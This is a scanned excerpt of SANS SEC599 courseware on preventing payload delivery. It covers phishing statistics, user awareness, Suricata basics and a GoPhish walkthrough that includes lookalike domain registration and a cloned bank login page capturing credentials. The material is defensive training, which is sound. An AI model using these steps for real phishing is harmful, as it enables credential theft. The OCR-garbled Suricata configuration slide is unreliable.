SEC599 I DEFEATING ADVANCED ADVERSARIES
599.2
Averting Payload Delivery
THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH I sans.org

Copyright© 2017, Erik Van Buggenhout & Stephen Sims. All rights reserved to Erik Van Buggenhout & Stephen Sims and/or SANS Institute.
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE ASSOCIATED WITH THE SANS COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE "USER") AND THE SANS INSTITUTE FOR THE COURSEWARE. YOU AGREE THAT THIS AGREEMENT IS ENFORCEABLE LIKE ANY WRITTEN NEGOTIATED AGREEMENT SIGNED BY YOU.
With the CLA, the SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the terms of this agreement. Courseware includes all printed materials, including course books and lab workbooks, as well as any digital or other media, virtual machines, and/or data sets distributed by the SANS Institute to the User for use in the SANS class associated with the Courseware. User agrees that the CLA is the complete and exclusive statement of agreement between The SANS Institute and you and that this CLA supersedes any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.
BY ACCEPTING THIS COURSEWARE, YOU AGREE TO BE BOUND BY THE TERMS OF THIS CLA. BY ACCEPTING THIS SOFTWARE, YOU AGREE THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO THE SANS INSTITUTE, AND THAT THE SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.
If you do not agree, you may return the Courseware to the SANS Institute for a full refund, if applicable.
User may not copy, reproduce, re-publish , distribute, display, modify or create derivative works based upon all or any portion of the Courseware, in any medium whether printed, electronic or otherwise, for any purpose, without the express prior written consent of the SANS Institute. Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any way, shape, or form without the express written consent of the SANS Institute.
If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall be deemed to be severable from this CLA and shall not affect the remainder thereof. An amendment or addendum to this CLA may accompany this courseware.
SANS acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in this courseware are the sole property of their respective trademark/registered/copyright owners, including:
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, ilife, iMac, iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac, Mac Logo, MacBook, MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina, Safari, Siri, Spaces, Spotlight, There's an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and iCloud are registered trademarks of Apple Inc.
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA.
SEC599_2_C01_03

SECS99.2

Defeating Advanced Adversaries

Averting Payload Delivery

© 2017 ErikVan Buggenhout & Stephen Sims I All Rights Reserved I Version SECS99_ CO I_03

This page intentionally left blank.

© 2017 Erik Van Buggenhout & Stephen Sims

TABLE OF CONTENTS
Strategies for Preventing I Detecting Payload Delivery End-User SecurityAwareness Leveraging Suricata IDS / IPS E-mail Security Controls
EXERCISE: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules
EXERCISE: Finding the Needle in the Haystack UsingYARA Web Security Controls
EXERCISE: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions
EXERCISE: Developing Eye-Candy Using Kibana
This page intentionally left blank.

-06 10 22 33 51 56 78 81 IOI 104 114 132

2

© 2017 Erik Van Buggenhout & Stephen Sims

TABLE OF CONTENTS
Controlling Script in the Enterprise EXERCISE: Controlling Scripts Using GPO's
SANS
This page intentionally left blank.

-135 186

© 2017 Erik Van Buggenhout & Stephen Sims

3

Where Are We in the APT Attack Cycle?

In section 1 of this course, we discussed the APT Attack Cycle & reconnaissance. Today, we will start zooming in on how we can prevent and detect payload delivery!

I..- ~ ..": k;,; . ,

. ·

Exploltatlon

· ' Comrrnnd & · ·;

Control

··

ome©@®@

,----,,,~'<'---,

Delivery

.

-

;. '· ' Installation· ,· '.

Action on Objectives

SANS

Where Are We in the APT Attack Cycle? Welcome to Day 2 ofSEC599! While we introduced the APT Attack Cycle during section I ofthe course, we will now start zooming in on how a defender can counter the first phase of the attack: Payload Delivery. Once reconnaissance has been completed, delivery is the first step in which the defender ca11 have an impact, as weaponization is an activity performed by the adversary on his own ground. This, however, doesn't mean
we'll completely ignore it: We will, ofcourse, discuss adversary tactics & techniques throughout the rest of
the course!
Adversary perspective With this step, the attack effectively starts his attack. The payload created in the previous step must be delivered to the victim(s) selected in the reconnaissance phase. This delivery can be done through various vectors:
· Sending e-mails to the victims with malicious payloads (or links to download the payload); · Interact via social media like Facebook or Twitter and send malicious links to the victims; · Copy the malicious payload to removable media such as USB sticks, and deliver the media to the
victims. This can be delivered via e-mail or courier, or more surreptitiously by dropping some USB sticks were the victims tend to gather, like a staff parking lot or near vending machine; · Another interesting mechanism is the "watering hole" attack. In a watering hole attack, the adversaries will first compromise other, unrelated, websites that tend to be visited by the victims.
Defender perspective
Being able to detect attacks this early in the digital kill chain is a key capability for defenders: the earlier we can detect adversaries in the kill chain, the less they will be able to reach their objectives. End-user awareness is a key security control here: if people understand how advanced adversaries operate, they can be the first layer ofdefense. Next to end-user awareness, there's also a number oftechnical controls that can be implemented:

4

© 2017 Erik Van Buggenhout & Stephen Sims

Network security technologies such as mail sandboxes, JPS engines, or web proxies... · Mail sandboxes will allow us to investigate incoming e-mail and block malicious attachments or URLs; · IPS engines can block known attack signatures at network level; · Web proxies can be used to block access to suspicious / malicious websites.
Host-based security technologies such as Antivirus or Anti-Malware software; · Antivirus engines to detect the low-hanging fruit and generic payloads; · Anti-Malware technology (typically agents) that can analyze the system for suspicious application behavior.
As ofthis point in the kill chain, defenders have a realistic chance of detecting the incoming attack. It is thus ofvital importance to ensure logging & monitoring is well-configured throughout the enterprise. In order to detect advanced adversaries, logging & monitoring should focus both for known bads (signature-based, IOCs. ..) and unknown bads (behavior-based, TTPs...).

© 2017 Erik Van Buggenhout & Stephen Sims

5

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertine Payload Delivery
· Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

·SEC599.2 Strategies for Preventing / Detect.ing Payload Delivery End-User Security Awareness Leveraging Suricata IDS / IPS E-mail Security Controls Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules Exercise: Finding the Needle in the Haystack Using YARA Web Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

SAN~

This page intentionally left blank.

6

© 2017 Erik Van Buggenhout & Stephen Sims

How Are Payloads Being Delivered?

Once reconnaissance has been completed, the adversary will attempt to deliver a weaponized payload

Current main intrusion methods include:

·

IMalicious e-mail attachments or web pages (watering holes) through (spear) phishing.

D I Abusing a flaw in the external Internet perimeter (application or infrastructure level).

IInserting infected removable media (this would, however, require physical interaction with the target).

ICompromise third parties in the supply chain and abuse trust relationships.

SAN~

How Are Payloads Being Delivered'? Once the reconnaissance activities have been completed, the adversary will attempt to deliver a weaponized payload to the target. Typical intrusion methods in use today include:
· Malicious e-mail attachments or web pages (watering holes) through (spear) phishing. Due to its success rate and fairly low complexity, this is by far the most common delivery method today.
· Abusing a flaw in the external Internet perimeter (application or infrastructure level). Due to increased security controls & awareness, this is becoming less frequent. It does however still occur, as evidenced for example by the Wery ransomwarc that hit organizations in 20 17. The ransomware spread through
an (at the time) recent SMB exploit.
· Inserting infected removable media. This would, however, require a form ofphysical interaction with the target: either by physically shipping for example USB keys or by physically intruding the target organizations' premises.
· Compromise third parties in the supply chain and abuse trust relationships. In an ever-more connected world, organizations are partnering with other parties (e.g. vendors or suppliers), which don't always adhere to the same security standards as themselves. This opens an opportunity for adversaries, as they could first compromise less secured third parties and use them as a stepping stone towards the actual target (by abusing trust relationships).

© 2017 Erik Van Buggenhout & Stephen Sims

7

How Are Payloads Being Delivered? - Some Statistics
Based on different publications from the past couple of years, we've noted the following interesting statistics that are relevant to us:
· 66% of malware was installed via malicious e-mail attachments (Data Breach Investigations Report, Veri:wn, 2017)
· 78% of people claim to be aware of the dangers of phishing, but 45% of them still click a phishing link (Friedrich-Alexander University, 2016)
· In Q1 2017, 1 in 131 e-mails contained malware (Symantec, 2017)
These statistics are in line with what we are seeing across the industry
How Are Payloads Being Delivered? - Some Statistics The past couple ofyears, different publications have been made, showing some interesting statistics on how payloads are being delivered. According to the Data Breach Investigations Report from Verizon, 66% of malware was installed via malicious e-mail attachments. ( Data Breach Investigations Report, Verizon, 20 17, http://www.verizonenterprise.com/verizon-insights-lab/dbir/2017/)
Even though 78% of people claim to be aware ofthe dangers ofphishing, 45% of them still click a phishing link. However, only 20% of the participants stated they had clicked the link. Researchers believe this discrepancy could be due to simply forgetting that they had clicked the link in the message they received. So even though users claim to be aware ofthe risks, often their curiosity is still enough to have them click suspicious URLs. (Friedrich-Alexander University, 2016, https://www.fau.eu/20 16/08/25/news/research/onein-two-users-click-on-links-from-unknown-senders/)
Finally, in QI 2017, about I in 131 e-mails contained malware, again highlighting the fact that e-mail has become the weapon of choice for an adversary to deliver payloads. Symantec, 2017, https://www.symantec.com/security-center/threat-report)
These statistics are in line with what we are seeing across the industry: phishing is effective and easy to do, making it the weapon of choice for payload delivery.

8

© 2017 Erik Van Buggenhout & Stephen Sims

Preventing and Detecting Payload Delivery

Given the delivery methods listed in the previous slide, the below are key points to prevent / detect payload delivery:

· Identify all ingress points (both physical & IT) and implement detective & preventive security controls

· Implement a "zero-trust " principle throughout the organization (supported by policies & technology)

· As staff are very likely to be involved during payload delivery, invest in end-user awareness to recognize delivery methods

· Assess the security of third parties (suppliers/ vendors)

SANS

Preventing and Detecting Payload Delivery Knowing the IT environment ofyour enterprise is key in preventing and detecting initial intrusions.
Initial intrusion can happen in several ways, depending on the ingress points you have in your enterprise. There's no enterprise in the world that does not use e-mail. Malicious e-mail attachments and e-mails with malicious URLs are often used as ingress point since every enterprise has to accept e-mail to conduct business. A less obvious ingress point might be USB sticks. In targeted attacks, USB sticks with malicious content have been left in places where staffgathers, such as parking lots. A curious employee might pick up the "dropped" USB stick, insert it in his/her office computer and execute malware.
It is important to assess the security of third parties as well since these might provide an "easy way in" for attackers. What good is your top-notch security ifyour neighbor leaves the door open? Certain services might potentially be exposed to trusted third parties only. In case an attacker is able to compromise one of these, he/she might have found an alternative path into your organization.
That brings us to the zero-trust principle, which is based on "never trust, always verify". As a result of this principle, all resources should be securely accessed, through a least privilege strategy and strict access controls. Another consequence is that all traffic will be logged and inspected. This approach avoids internal pivoting by an attacker once an internal trusted network was compromised.
Since users are still often the weakest link in a company's defenses, it is important to invest in security awareness. Users should be able to recognize a phishing e-mail (or at least a badly structured one) and critically assess the circumstances during which certain suspicious e-mails are received.
As a final word, it should be noted that identifying ingress points and vulnerable technology in your enterprise is not a one-shot process: The IT environment ofyour enterprise is constantly changing. Therefore, it is good practice to include a step in your enterprise's change management process to evaluate changes and the opportunities they bring to (advanced) adversaries.

© 2017 Erik Van Buggenhout & Stephen Sims

9

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertine Payload Delivery
· Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
· Strategies for Preventing / Detecting Payload Delivery End-User Security Awareness Leveraging Suricata IDS / IPS E-mail Security Controls Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules Exercise: Finding the Needle in the Haystack Using YARA Web Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Scr-ipt in the Enterprise Exercise: Controlling Script Using GPO's

SANS

This page intentionally left blank.

10

© 2017 Erik Van Buggenhout & Stephen Sims

The Importance of Users in Cyber Security
Regardless of your technical controls, end-users can greatly lower the security posture of your organization:
· Users clicking on malicious links in e-mails · Users opening unknown files (executables, docs...) · Users selecting weak passwords for corporate accounts · Users sharing credentials or other sensitive information · Users bringing infected devices into the corporate environment (USB
keys, phones, tablets...) · Users allowing physical access to unauthorized visitors
·
The Importance of Users in Cybcr Security There's a reason why the end user is often called the weakest link in cyber security. Even using the most advanced technological defense mechanisms, your organization can still get breached through a single user's error.
E-mails received by users can contain URLs pointing to a malicious domain, potentially containing exploit kits or phishing pages. These e-mails could contain malicious attachments, such as executables or macro-ridden documents.
The danger not only lies in users as the receiver of malicious e-mails, but a lso in users as a source ofbad security practices. Often applications are used through shared accounts by multiple users. To keep things "easy", these accounts have weak passwords set that everyone can remember. Alternatively, user's private accounts have predictable passwords reflecting the time ofyear, such as "password+summer20 17".
Finally, users pose a physical threat as well. Today's BYOD trend introduce various mobile devices into the organization's premises. Next to the smartphone threat, an infected USB stick could be inserted in the user's workstation. Do you a lways verify everyone's identity, making sure they really are who they claim to be? There's a large chance sorm: user at your organization doesn't and lets an attacker social engineer his/her way mto the organization.

© 2017 Erik Van Buggenhout & Stephen Sims

11

End-User Security Awareness

Ell Building user awareness is a key element to protect your enterprise. The attacker will attempt to obtain access to your environment by abusing the weakest link, which is typically your end-users.

·

IUsers should be educated to understand what cyber attacks look like and the role they play in preventing / detecting them. This is important for ALL personnel, from secretaries to IT administrators and C-level executives.

I l l End-user security awareness is not a one-off, it should be an iterative process where employees continuously receive tailored training & education on cyber attacks.

End-User Security Awareness When discussing strategics for preventing and detecting initial intrusions, we focused on technological solutions. However, user awareness is an important aspect to protect the enterprise. Often in an initial intrusion, users will be the target of the attack: they will receive an e-mail with a malicious attachment, they will visit a malicious website by clicking on a link, they might be called on the phone by a social engineer...
lfthe user does not open the malicious attachment or does not click on the malicious link, then the attack will be prevented. It sounds simple, but such attacks involve an element ofsocial engineering to stimulate the user to open or click. Making the user aware of such attacks and the risks they bring, can help alleviate the risk of successful attacks that require user interactions.
To recognize potential attacks, users must be trained. There are companies specialized in training users to raise awareness. They can focus on recognizing phishing e-mails and other spoofed e-mails, good password practices, recognizing and dealing with social engineers ...
This training can be done in a classroom, but is often done online: the user is invited to visit a website where she will receive more information on a particular security topic (for example phishing), and then their knowledge will be tested in a couple ofexercises that simulate phishing attacks.
This is not a one-shot process. To remain aware and vigilant, the awareness message must be repeated. To stimulate this, user awareness companies offer phishing s imulation "attacks". Unsuspecting users receive a phishing e-mail from a simulated company and are supposed to report the phishing e-mail. lfthey do not recognize the (simulated) phishing attack and click on a link, for example, the user awareness company detects this and flags the employee for further training.

12

© 2017 Erik Van Buggenhout & Stephen Sims

End-User Security Awareness - Key Messages
· Why is cyber security important to the organization? · What does a cyber attack look like? · Why are certain security controls required? (Convince people of
their use and why they shouldn't be avoided) · How can employees (in their specific role) prevent / detect attacks?
(tailor your message to the audience) · What kind of behavior should be reported and how should it be
reported? · Use different delivery formats: presentations, lunch sessions,
exercises (e.g. "mystery guest", phishing...)

End-User Security Awareness - Key Messages This slide contains a number of key questions that you want your users to know the answers to.
Depending on the organization, there could be different reasons why cyber security is important. For a hospital, it could be important to protect patient information. For a web shop, it could be important to protect the client's payment data and the organization's profits. This message will depend on the organization's business model.
,,...
Cyber attacks can be split up into a number ofcategories. Again, depending on the organization, or even on the audience ro le, d ifferent cyber attacks could be relevant. Spear phishing attacks will mostly be aimed at personnel tilling important roles in the organization. A generic ransomware could be sent to a large number of users. Certain organizations, such as governments, might be targeted by advanced threats aimed at stealing information.
Users might experience certain security measures as overkill, or even as some fonn of bullying. It's important for them that they realize why certain security controls are needed and what the consequences could be if they are lacking. If the users believe in the security contro ls, they wi ll be more eager to adopt and enforce them. This is best done by cultivating an enterprise culture where security is considered important and on everybody's mind. This also requires formalized policies and management support, who must lead by example.
Humans cannot process large amounts of data like digital systems can, but humans are much better at identifying anomalous behavior. To benefit the most from staff member's knowledge ofthe enterprise, a strategy for preventing and detecting initial intrusions must involve the human factor. Depending on the user's role in the organization, everyone could help in preventing or detecting attacks in their own way. People at the reception are tJ1e first step in preventing social engineering, while the IT department might be a target for phishing attacks.
User awareness is an essential strategy for preventing and detecting initial intrusions. Different delivery formats can help convey the message and assess the current state of awareness. Presentations and lunch sessions can help to convey the theoretical aspects, while exercises such as a phishing test can help to determine the user's adoption rate.

© 2017 Erik Van Buggenhout & Stephen Sims

13

End-User Security Awareness - Zooming on Phishing
IA phishing attack is a method using little or no technology to obtain confidential information or have an action performed.
ISpear phishing is targeted phishing: instead of a large group, a very small group of persons is phished.
IPhishing is a form of social engineering: an attempt to induce a person to share information or perform an action that that person would not do under "normal" circumstances.
End-User Security Awareness - Zooming in on Phishing Phishing is not a highly technical attack. It is a social engineering attack. where the target is persuaded to divulge information or perform an action that the person would not do under normal circumstances. Due to its effectiveness and relatively low effort investment, it is the most dominant delivery method used today, both by highly skilled and lesser skilled adversaries.
Take for example a social engineering attempt where a staff member is called on the phone by the social engineer, with the goal ofobtaining the user's password. If the social engineer would call the employee and flat-out ask for their password, the chance ofsuccess would be very low. The user knows that the password has to be kept secret, and will most likely not tell anyone when asked on the phone. The social engineer will try to persuade the user that it is normal that the user is asked for his/her password. A sample explanation could be that the social engineer is a system administrator who needs the user's password for an account update and that otherwise, the user will lose access to the account.
Originally phishing involved obtaining confidential information, like passwords, but we encompass performing actions too in our definition. Phishing usually involves a large g roup of persons: for example, emails are sent to thousands ofuscrs to obtain their Gmail password. When phishing is perfonned against only one, or a limited number of personc;, we talk about spear phishing. Spear phishing can be v1:ry dTecrive, as the social engineering message can be tailor-made for the target. A c urrent example ofspear phishing is CEO fraud: fake e-mail messages, supposedly written by the CEO, are sent to the CFO to initiate a large financial transaction to a foreign account under the control of the attackers.

14

© 2017 Erik Van Buggenhout & Stephen Sims

'
Setting Up Your Own Phishing Exercises
GoPhish is an open-source phishing platform for businesses and penetration testers. GoPhish provides an easy-on-the-eye administration web GUI where campaigns can be easily created, launched and monitored.
Register a familiar-looking domain name aimed at tricking users into believing it belongs to the organization you are trying to spoof: · bankofamerica.org · bankoramerica.com
Setting Up Your Own Phishing Exercises In a simulated phishing attack, the user will receive an e-mail claiming to come from an o rganization they know. Ln this example, we target customers from Bank of America. The e-mail is not sent by bankofamerica.com, but by the company hired to test the users' security awareness. Launching a phishing campaign using a spoofed e-mail address can be performed by anyone. The next slides will detail an approach using the GoPhish platform (https://getgophish.com/). The first step ofthe assessment consists of registering the target domain name. ln this case, we would register bankofamerica.com. In case this domain name is already taken, for example by the legitimate bank or company we want to use as our phishing source, we would register a domain name that strongly resembles the original domain. An example could be to use a different extension (bankofamerica.org) or to replace a character with a similar-looking one (bankofarnerica.com). We can then use this domain as a source of our phishing e-mails.

© 2017 Erik Van Buggenhout & Stephen Sims

15

Setting Up Your Own Phishing Exercises - Users
New Group

GoPhish Users & Groups
Using GoPhish's "Users & Groups", we can split up our target audience in different groups. Some potential groups could be HR, IT. C-level. ..
Users can be added to the groups through the user interiace or using a bulk import mechanism.
SAN~

IPd:1¥5

J'(lhf\~fM·:·:·

uo
....,.

Position 8

Ill
.. ,

a w,1.,

Setting Up Your Own Phisbing Exercises- Users
Time to decide which groups and users we want to target. GoPhish allows us to create different groups, which can be used to split up our target audience into different groups based on department, level, or even potential susceptibility to a phishing e-mail. It's possible to add users one by one using the user interface or to import a file with the bulk transfer.

16

© 2017 Erik Van Buggenhout & Stephen Sims

Setting Up Your Own Phishing Exercises - Email Te mplate

,,....._

[ii]

,,.....

um,
-l-fU-1',,

,,....

,,....

I

,,....

SANS
Setting Up Your Own Phis hing Exercises - Email Template We can set up various e-mail templates aimed at different target audiences or for different phishing campaigns. An existing e-mail can be imported, or the content can be edited in-place through a text or HTML editor. Using placeholders, it's possible to retrieve user information that is updated for every e-mail sent, such as the user's name for example. If we select to add a tracking image, we can determine which users opened our e-mail, even if they do not click the URL.
Our phishing e-mail will urge the users to confirm their account. They can do this by following the URL in the e-mail. In the next slide, we will determine the contents of the URL landing page.

© 2017 Erik Van Buggenhout & Stephen Sims

17

Setting Up Your Own Phishing Exercises- Landing Page
New Landing Page
-

G oPhish landing page
After a user clicks the phishing URL. they are shown a landing page.The contents of this page can be customized. If we want. we could import the sign-in page from a known bank. In this case, we will simply notify them that they fell for a phishing e-mail.

-........ .,..._..,w, .....

Capture submitted data with or without passwords. Clear text!

Setting Up Your Own Phishing Exercises - Landing Page We can customize the page that we show users who fell for the phishing e-mail and clicked the URL. One option would be to import the sign-in website used by Bank of America. This would result in a land ing page that completely mimics the legitimate sign-in page, but could allow us to capture the credentials submitted by the user. We can select to capture data they inputted with or without passwords, but do note that the passwords will be transferred over clear text in this case.
In this case, we will simply show a header to notify the users they fell for a phishing e-majf. In case ofa phishing simulation, it could be advisable to notify users they have to keep the phishing exercise for themselves so they don' t warn anyone else. Another possibility is to add awareness advice on the landing page.

18

© 2017 Erik Van Buggenhout & Stephen Sims

Setting Up Your Own Phishing Exercises - Sending Profile
New Sending Profile
Setting Up Your Own Phishing Exercises - Sending Profile To be able to actually send e-mails, GoPhish requires you to configure SMTP relay details called "Sending Profiles". It's important to make sure that your "From" address is a valid e-mail address format. Additionally, make sure you set up your "Host" in the full host:port format. If you want to test the SMTP configuration, you can click the "Send Test Email" button.

© 2017 Erik Van Buggenhout & Stephen S ims

19

Setting Up Your Own Phishing Exercises- Campaign

New Campaign
·"-...

GoPhish campaigns

...........

As a final step. we will be putting it all together and

u111. 0

create a new campaign containing the different

elements we just configured. When all fields have been filled, it's time to launch the

-

..

campaign.

-"'"' '

~ "' """~·--
SAN.~

Setting Up Your Own Phishing Exercises - Campaign When launching a new campaign, we can fill all the fields with the elements we just created. The fields will auto-suggest as soon as you start typing, making this a quick final step before being able to launch the campaign. After the campaign has been launched, it's possible to view statistics in the campaign's dashboard.

20

© 2017 Erik Van Buggenhout & Stephen Sims

End-User Awareness - Additional Resources
Some additional resources that can prove to be useful for end-user awareness include:
· https: //getgophish.com/ Official GoPhish page
· https: //securingthehuman.sans.org/ SANS Securing The Human program https: //securingthehuman.sans.org/resources/newsletters/ouch SANS Securing The Human - Free Ouch! Monthly newsletter
· https://www.social-engineer.org/ Good overall social engineering resource
End-User Awareness -Additional Resources Some additional resources that can prove to be useful for end-user awareness include:
https://getgophish.com/ Official GoPhish page https :/ /securingthehuman.sans.org/ SANS Securing The Human program https: / /securingthehuman.sans.org/resources/ newsletters/ouch SANS Securing The Human - Free Ouch! Monthly newsletter
https://www.social-engineer.org/ Good overall social engineering resource

© 2017 Erik Van Buggenhout & Stephen Sims

21

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertine Payload Delivery
· Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
· Strategies for Preventing/ Detecting Payload Delivery End-User Security Awareness Leveraging Suricata IDS / IPS E-mail Security Controls Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules Exercise: Finding the Needle in the Haystack Using YARA Web Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

SANS

This page intentionally left blank.

22

© 2017 Erik Van Buggenhout & Stephen Sims

Introducing Suricata

,,

Suricata is a free, open-source, network

threat detection / prevention engine

· Maintained by the Open Information Security Foundation (OISF) · First introduced in July 2010 · Can be deployed on a variety of OSes (Linux, Windows...) · Main use cases include IDS, IPS, NSM and offline PCAP processing · Standard input / output formats (e.g. YAML, JSON...) allow easy
integration · Can help us detect / block several steps in the APT Attack Cycle
SA~

Introducing Suricata Suricata is an open-source network detection and prevention engine. Suricata is the Latin name for a mccrkat, a small mammal standing on its hind legs always looking out for signs of danger. Suricata is free and runs on different operating systems like Linux and Windows.
It is developed and maintained by the Open Information Security Foundation, who first introduced it in July 20 I0. It is a free, open-source project with many developers and contributors.
Suricata can be used for many purposes: · As Intrusion Detection System · As Intrusion Prevention System · As Network Security Monitor · An engine to process network capture tiles (PCAP files) offiine
It can be easily integrated with other products because of its openness. It uses well-known, standard formats
for input like YAML and JSON.
YAML (YAML Ain't Markup Languagt:) is a structured data format used for configuration files, that can easily be read by humans too.
JSON (JavaScript Object Notation) is another structured data fonnat used to serialize objects. Objects are data structures with properties. JSON contains the names of objects, properties, and their values.
Suricata has built-in functionality to support detection / blocking ofseveral steps in the APT Attack Cycle. Some examples include:
· Detecting the activity ofexplo it kits in HTTP traffic; · Detecting Command & Control communications (beaconing...); · Detecting malicious pay loads being delivered via e-mail (SMTP);

© 2017 Erik Van Buggenhout & Stephen Sims

23

Suricata Use Cases
As input, Suricata typically takes network traffic (either PCAP or live traffic) and parses out the following:

· Alert on IDS signatures ("Alert")

· Generate e-mail logs ("SMTP") · Generate DNS logs ("DNS")

Suricata is often considered as "just an IDS" or "a replacement for Snort".

· Generate HTTP logs ("HTTP") · Generate TLS logs ("TLS") · Generate NetFlow logs ("Flow")

As you can see in the listing to the left, however. it includes much more than just IDS alerting.We will use Suricata for detection & prevention through different phases of the APT Attack Cycle.

· Carve out raw files from network stream ("File")

SAN~

Suricata Use Cases Suricata takes network traffic as input to be processed by its engines and parsers. Typically, the network traffic is a live capture or capture files (PCAP files).
Suricata is often thought of as a replacement for Snort, an IDS/IPS. But Suricata can do more: it will alert on network traffic and block network traffic using IDS signatures (rules). This is not all Suricata can do, it can also produce logs for various types oftraffic:
· Analyzing SMTP network traffic to generate e-mail logs · Analyzing DNS network traffic to generate DNS logs (domain names) · Analyzing HTTP network traffic to generate HTTP logs (web surfing) · Analyzing TLS network traffic to generate TLS logs (secure web surfing via HTTPS) · Analyzing network traffic to generate NetFlow logs
Suricata will decode traffic before it is processed, like decompressing (gzip) HTTP responses and decoding SMTP MIME messages (BASE64).
Suricata can also carve out raw files from network traffic, for further analysis or slurage on disk.

24

© 2017 Erik Van Buggenhout & Stephen Sims

Suricata Configuration File
, $ur\ot· CNtl91.>r·tlOf\ ttle. In .add\llon to th~ ,,,...ftU d~scr\.b\f\9 t\.\ t opt \ons. ln th\S ftle, full 6o<~n,n ton can be found 6t: .- http~://redftlne .opel\totoucfound,t \on.o,o/oro)ects/sur\c.ita/v\kt I surtuu y..-\
....1-a St·p 1: tnror1111 Sur-lc·u about y-o~;ir f'ietworl:
._..,,:
· l'IOre ,~\fc. ts better for ·lert Kc.urt c.y ·nd p,erfor,wnce·ddrns·9roups:
H0fl.£_HET: '"(:l'2, lU , ID.8/ 16,10.0 .e.O/I, 172. \6.I.ID/12)'· IHOftt_.HU : · [1,z.1te.o.a/16)'"' ,~_H[l: "[10.0.t-·f·J·
'""""-"u: ·1111.16.o.e112i,HOtU!...NU : "1ay·
f XJf~NAl_~ET: ·,s~E_H'tT" l (XTUNAL_KEJ ! "'any"
lttlP_SERvutS: "$H()f'lt_N(.T9 SUQ\flP_5[SREVAEVJEIRSS: ~_"'S_ttO_ N,(NHETU" · OffS_SPVl!U: "SHOftE_Nft · TElkET_SUtVCIS: "S:J4QrttE_N£:T" 4tft_SERY£AS: · $E,XTERNAL..HCl .. ~ J_StllVft: "5"°"f_HU· 0~3- CUENf: "S,,HOM.E_Pftr· MOOIU1,_Ctl(NT1 "$HON(_HEr

Suricata configuration
The majority of tweaks and settings can be configured in the Suric.ata.yaml file (/etdsuricata/suricata.yaml).
Muting certain rules (e.g. due to excessive false positives) can be done in the threshold file (/etdsuricata/threshold.config).

Suricata Configuration File Suricata works with configuration files. These files follow the YAML standard, and the main configuration fi le is suricata.yaml. On Linux, this file can be found in /etc/suricata, but it is an option that can be provided when the Suricata engine is started.
The configuration file contains comments (lines starting with #) with explanations for the various settings and examples of configuration options.
It is organized in associative arrays and a typical suricata.yaml configuration file starts with the definition of variables. This is done with the vars associative array.
Important variables are the I--IOME_NET variable and the EXTERNAL_NET variable. They define what is considered as an internal network and external network by Suricata.
In the example above, the HOME_NET variable is set to all the private IP ranges (192.168.0.0/ 16, 10.0.0.0/8 and 172.16.0.0/12). The EXTERNAL_NET is defined as all networks that are not the internal networks (!HOME_NET, ! stands for not).
Suricata works with signature (rules). When rules generate too many alerts, they can be muted in the threshold.config ti le. Muting a rule prevents it from generating an alert. Rules can be muted for al I network traffic, or only for certain sources or destinations.

© 2017 Erik Van Buggenhout & Stephen Sims

25

Suricata IDS ("Alert")
· The Suricata IDS / IPS engine works using a predefined list of rules · These rules can be free / open-source, commercial or even fully custom · Rules are categorized and are ranked with a "severity" · To understand the direction ofthe traffic (incoming vs outgoing), the
rules rely on a network range definition:
HOME_NET: 192.168.1.0/24 EXTERNAL_NET: !HOME_ NET
Wrong network range definition renders the IDS largely useless
SAN.~
